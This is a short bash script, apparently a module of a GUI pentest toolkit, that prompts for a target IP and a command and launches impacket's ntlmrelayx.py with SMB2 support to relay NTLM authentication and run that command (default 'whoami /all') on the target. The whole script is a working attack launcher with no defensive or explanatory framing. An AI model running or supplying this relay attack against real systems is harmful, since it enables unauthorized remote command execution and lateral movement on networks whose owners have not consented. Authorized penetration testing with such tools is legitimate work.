#!/bin/bash

: '
ntlmrelayx: NTLM relayx attack, execute cmd
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
TARGET_IP_FIELD=$(form_item "target ip" "target_ip")
CMD_FIELD=$(form_item "CMD" "cmd" "whoami /all")

# Generate GUI form
generate_form "${TARGET_IP_FIELD}" "${CMD_FIELD}"

TARGET_IP=${form_data["target_ip"]}
CMD=${form_data["cmd"]}

execute_command "ntlmrelayx.py --no-http-server -smb2support -t ${TARGET_IP} -c '${CMD}'"
create_new_line
